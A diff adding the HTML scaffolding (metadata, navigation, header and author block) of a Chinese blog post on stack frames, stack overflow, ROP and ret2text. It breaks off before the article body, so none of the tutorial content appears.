@@ -1,0 +1,1935 @@
+<!doctype html>
+<html
+  lang="zh-cn"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="zh-cn">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  
+    <title>栈帧、栈溢出、ROP、ret2text &middot; KA&#39;s Blog</title>
+    <meta name="title" content="栈帧、栈溢出、ROP、ret2text &middot; KA&#39;s Blog">
+  
+
+  
+  
+    <meta name="description" content="超级嗨客的基础课 --- 栈攻击">
+  
+  
+  
+  
+  <link rel="canonical" href="http://localhost:1313/posts/pwn/ret2text/">
+  
+
+  
+  
+    <meta name="author" content="KioroshiAki">
+  
+  
+    
+      
+        
+          <link href="https://github.com/kioroshiaki" rel="me">
+        
+      
+    
+  
+
+  
+  <meta property="og:url" content="http://localhost:1313/posts/pwn/ret2text/">
+  <meta property="og:site_name" content="KA&#39;s Blog">
+  <meta property="og:title" content="栈帧、栈溢出、ROP、ret2text">
+  <meta property="og:description" content="超级嗨客的基础课 — 栈攻击">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-03-05T18:00:00+08:00">
+    <meta property="article:modified_time" content="2026-03-05T18:00:00+08:00">
+    <meta property="og:image" content="http://localhost:1313/posts/pwn/ret2text/featured.png">
+      <meta property="og:see_also" content="http://localhost:1313/posts/pwn/pivot/">
+      <meta property="og:see_also" content="http://localhost:1313/posts/pwn/elf-basic/">
+      <meta property="og:see_also" content="http://localhost:1313/posts/pwn/pwntools/">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/posts/pwn/ret2text/featured.png">
+  <meta name="twitter:title" content="栈帧、栈溢出、ROP、ret2text">
+  <meta name="twitter:description" content="超级嗨客的基础课 — 栈攻击">
+
+  
+  
+  
+  
+    
+      
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.0975a8c7c266a0697f94839b45e1574c449de253527d44ed516d5c5c3c820c9389d7d86576faae12267b129f8749ecbf7581cddb636aba7690aa633b95aaa87d.css"
+    integrity="sha512-CXWox8JmoGl/lIObReFXTESd4lNSfUTtUW1cXDyCDJOJ19hldvquEiZ7Ep&#43;HSey/dYHN22NqunaQqmM7laqofQ==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js"
+    integrity="sha512-b0EXSzoFtoCCD&#43;CMrb&#43;l&#43;3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script>
+  
+  
+  
+  
+  
+    
+    <script
+      type="text/javascript"
+      src="/js/zen-mode.min.9814dee9614d32aeb56239d118edfe20acd6231424f9b19c2dd48835038414130a5e946c0d1c9087d60e60e31840c9babfd217e3d4b95643dc8d651a71ccdf4a.js"
+      integrity="sha512-mBTe6WFNMq61YjnRGO3&#43;IKzWIxQk&#43;bGcLdSINQOEFBMKXpRsDRyQh9YOYOMYQMm6v9IX49S5VkPcjWUacczfSg=="></script>
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+  
+
+  
+  
+  
+    
+  
+  
+  
+    
+  
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.35f47889fc6a3c1a4a61584d7a5ced5dba0a4fc9af07b15bb6e660134b25ad0d6eee516605924230e64d184bfcc4f417ef710cc4eecf4cda2c6a944f4312f7d6.js"
+      integrity="sha512-NfR4ifxqPBpKYVhNelztXboKT8mvB7FbtuZgE0slrQ1u7lFmBZJCMOZNGEv8xPQX73EMxO7PTNosapRPQxL31g=="
+      data-copy="复制"
+      data-copied="已复制"></script>
+  
+
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "文章合集",
+    "name": "栈帧、栈溢出、ROP、ret2text",
+    "headline": "栈帧、栈溢出、ROP、ret2text",
+    
+    "abstract": "超级嗨客的基础课 \u0026mdash; 栈攻击",
+    "inLanguage": "zh-cn",
+    "url" : "http://localhost:1313/posts/pwn/ret2text/",
+    "author" : {
+      "@type": "Person",
+      "name": "KioroshiAki"
+    },
+    "copyrightYear": "2026",
+    "dateCreated": "2026-03-05T18:00:00\u002b08:00",
+    "datePublished": "2026-03-05T18:00:00\u002b08:00",
+    
+    "dateModified": "2026-03-05T18:00:00\u002b08:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "4332"
+  },
+  {
+    "@context": "https://schema.org",
+    "@type": "BreadcrumbList",
+    "itemListElement": [{
+          "@type": "ListItem",
+          "position":  1 ,
+          "name": "文章合集",
+          "item": "http://localhost:1313/posts/",
+        },{
+          "@type": "ListItem",
+          "position":  2 ,
+          "name": "栈帧、栈溢出、ROP、ret2text",
+          "item": "http://localhost:1313/posts/pwn/ret2text/",
+        }]
+  }]
+  </script>
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+
+
+
+
+
+
+
+  
+    
+  
+
+
+
+
+
+
+
+  
+    
+  
+
+
+
+
+
+
+  
+  
+  <body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content">
+        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
+        跳过正文
+      </a>
+    </div>
+    
+    
+      <div class="min-h-[148px]"></div>
+<div class="fixed inset-x-0 z-100">
+  <div
+    id="menu-blur"
+    class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl"></div>
+  <div class="relative m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32">
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div
+  class="main-menu flex items-center justify-between py-6 md:justify-start gap-x-3 pt-[2px] pr-2 md:pr-4 pb-[3px] pl-0">
+  
+  
+
+  <div class="flex flex-1 items-center justify-between">
+    <nav class="flex space-x-3">
+      
+        <a href="/" class="text-base font-medium">
+          KA&rsquo;s Blog
+        </a>
+      
+    </nav>
+    
+  <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
+    
+      
+        
+  <a
+  href="/series/"
+  
+  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"
+  aria-label="分类"
+  title="文章分类">
+  
+  
+    <p class="text-base font-medium">
+      分类
+    </p>
+  
+</a>
+
+
+
+      
+        
+  <a
+  href="/posts/"
+  
+  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"
+  aria-label="文章"
+  title="文章合集">
+  
+  
+    <p class="text-base font-medium">
+      文章
+    </p>
+  
+</a>
+
+
+
+      
+        
+  <a
+  href="/about/"
+  
+  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"
+  aria-label="关于"
+  title="我    是    谁    ？">
+  
+  
+    <p class="text-base font-medium">
+      关于
+    </p>
+  
+</a>
+
+
+
+      
+        
+  <a
+  href="/friends/"
+  
+  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"
+  aria-label="友链"
+  title="友链合集">
+  
+  
+    <p class="text-base font-medium">
+      友链
+    </p>
+  
+</a>
+
+
+
+      
+        
+  <a
+  href="https://github.com/kioroshiaki"
+  target="_blank"
+  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"
+  aria-label="github"
+  title="">
+  
+    <span >
+      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span>
+    </span>
+  
+  
+</a>
+
+
+
+      
+    
+
+    
+
+    
+
+    
+
+    
+      <div class=" flex items-center">
+        <button
+          id="appearance-switcher"
+          aria-label="Dark mode switcher"
+          type="button"
+          class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+          <div class="flex items-center justify-center dark:hidden">
+            <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+          </div>
+          <div class="items-center justify-center hidden dark:flex">
+            <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+          </div>
+        </button>
+      </div>
+    
+  </nav>
+
+    
+  <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
+    <span></span>
+
+    
+
+    
+
+    
+
+    
+      <button
+        id="appearance-switcher-mobile"
+        aria-label="Dark mode switcher"
+        type="button"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400 me-1">
+        <div class="flex items-center justify-center dark:hidden">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+        </div>
+        <div class="items-center justify-center hidden dark:flex">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+        </div>
+      </button>
+    
+  </div>
+
+  </div>
+  
+  <div class="-my-2 md:hidden">
+    <div id="menu-button" class="block">
+      
+        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+        </div>
+        <div
+          id="menu-wrapper"
+          class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]">
+          <ul
+            class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none text-end max-w-7xl">
+            <li id="menu-close-button">
+              <span
+                class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+                <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+              </span>
+            </li>
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/series/"
+    
+    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"
+    aria-label="分类"
+    title="文章分类">
+    
+    
+      <p class="text-bg font-bg">
+        分类
+      </p>
+    
+  </a>
+</li>
+
+
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/posts/"
+    
+    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"
+    aria-label="文章"
+    title="文章合集">
+    
+    
+      <p class="text-bg font-bg">
+        文章
+      </p>
+    
+  </a>
+</li>
+
+
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/about/"
+    
+    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"
+    aria-label="关于"
+    title="我    是    谁    ？">
+    
+    
+      <p class="text-bg font-bg">
+        关于
+      </p>
+    
+  </a>
+</li>
+
+
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/friends/"
+    
+    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"
+    aria-label="友链"
+    title="友链合集">
+    
+    
+      <p class="text-bg font-bg">
+        友链
+      </p>
+    
+  </a>
+</li>
+
+
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="https://github.com/kioroshiaki"
+    
+      target="_blank"
+    
+    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400"
+    aria-label="github"
+    title="">
+    
+      <div >
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span>
+      </div>
+    
+    
+  </a>
+</li>
+
+
+
+            
+
+          </ul>
+          
+        </div>
+      
+    </div>
+  </div>
+
+</div>
+
+
+
+
+  <script>
+    (function () {
+      var $mainmenu = $(".main-menu");
+      var path = window.location.pathname;
+      $mainmenu.find('a[href="' + path + '"]').each(function (i, e) {
+        $(e).children("p").addClass("active");
+      });
+    })();
+  </script>
+
+
+  </div>
+</div>
+
+
+<script
+  type="text/javascript"
+  src="/js/background-blur.min.00a57c73ea12f2cab2980c3c3d649e89f6d82f190f74bbe2b67f2f5e39ab7d032ece47086400ca05396758aace13299da49aca43ea643d2625e62c506267a169.js"
+  integrity="sha512-AKV8c&#43;oS8sqymAw8PWSeifbYLxkPdLvitn8vXjmrfQMuzkcIZADKBTlnWKrOEymdpJrKQ&#43;pkPSYl5ixQYmehaQ=="
+  data-blur-id="menu-blur"></script>
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+  <article>
+    
+    
+      
+      
+      
+      
+        
+
+
+
+
+
+
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+
+
+
+
+
+
+  
+    
+    
+      
+      
+    
+  
+
+
+
+
+
+    <div id="hero" class="h-[150px] md:h-[200px]"></div>
+  
+  <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom">
+    
+    
+    
+    <img
+      id="background-image"
+      src="/posts/pwn/ret2text/background_hu_495de7f3d1a0bffc.jpg"
+      alt="栈帧、栈溢出、ROP、ret2text"
+      loading="eager"
+      decoding="async"
+      fetchpriority="high"
+      class="absolute inset-0 w-full h-full object-cover"
+      >
+    <div
+      class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div>
+    <div
+      class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div>
+  </div>
+
+  
+    <div
+      id="background-blur"
+      class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
+    
+    
+    <script
+      type="text/javascript"
+      src="/js/background-blur.min.00a57c73ea12f2cab2980c3c3d649e89f6d82f190f74bbe2b67f2f5e39ab7d032ece47086400ca05396758aace13299da49aca43ea643d2625e62c506267a169.js"
+      integrity="sha512-AKV8c&#43;oS8sqymAw8PWSeifbYLxkPdLvitn8vXjmrfQMuzkcIZADKBTlnWKrOEymdpJrKQ&#43;pkPSYl5ixQYmehaQ=="
+      data-blur-id="background-blur"
+      data-image-id="background-image"
+      data-image-url="/posts/pwn/ret2text/background_hu_495de7f3d1a0bffc.jpg"></script>
+  
+      
+    
+
+    
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="hidden">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/"
+      >KA&#39;s Blog</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/posts/"
+      >文章合集</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="hidden">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/posts/pwn/ret2text/"
+      >栈帧、栈溢出、ROP、ret2text</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        栈帧、栈溢出、ROP、ret2text
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2026-03-05T18:00:00&#43;08:00">2026-03-05</time><span class="px-2 text-primary-500">&middot;</span><span>4332 字</span><span class="px-2 text-primary-500">&middot;</span><span class="mb-[2px]">
+  <span
+    id="zen-mode-button"
+    class="text-lg hover:text-primary-500"
+    title="啟用阅读模式"
+    data-title-i18n-disable="啟用阅读模式"
+    data-title-i18n-enable="停用阅读模式">
+    <span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="50px" height="50px">
+    <path fill="currentColor" d="M 12.980469 4 C 9.1204688 4 5.9804688 7.14 5.9804688 11 L 6 26 L 9.9804688 26 L 9.9804688 11 C 9.9804688 9.35 11.320469 8 12.980469 8 L 40.019531 8 C 41.679531 8 43.019531 9.35 43.019531 11 L 43.019531 39 C 43.019531 40.65 41.679531 42 40.019531 42 L 29 42 C 29 43.54 28.420938 44.94 27.460938 46 L 40.019531 46 C 43.879531 46 47.019531 42.86 47.019531 39 L 47.019531 11 C 47.019531 7.14 43.879531 4 40.019531 4 L 12.980469 4 z M 7 28 C 4.794 28 3 29.794 3 32 L 3 42 C 3 44.206 4.794 46 7 46 L 23 46 C 25.206 46 27 44.206 27 42 L 27 32 C 27 29.794 25.206 28 23 28 L 7 28 z M 7 32 L 23 32 L 23.001953 42 L 7 42 L 7 32 z"/>
+</svg></span></span>
+  </span>
+</span>
+
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+            
+              <a class="relative mt-[0.5rem] me-2" href="/categories/pwn/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Pwn
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/categories/ret2text/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Ret2text
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/categories/rop/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    ROP
+  </span>
+</span>
+
+              </a>
+            
+          
+        
+      
+        
+      
+        
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+      </div>
+      
+        
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+    
+    
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+      
+      
+        
+        
+        
+      
+      <img
+        class="!mt-0 !mb-0 h-24 w-24 rounded-full me-4"
+        width="96"
+        height="96"
+        alt="KioroshiAki"
+        src="/img/blowfish_logo_hu_aa21873d9381d20c.png"
+        data-zoom-src="/img/blowfish_logo_hu_2b0742f9b901ea73.png">
+    
+  
+  <div class="place-self-center">
+    
+      <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+        作者
+      </div>
+      <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+        KioroshiAki
+      </div>
+    
+    
+      <div class="text-sm text-neutral-700 dark:text-neutral-400">Burning Love !!!!!</div>
+    
+    <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://github.com/kioroshiaki"
+          target="_blank"
+          aria-label="Github"
+          title="Github"
+          rel="me noopener noreferrer"
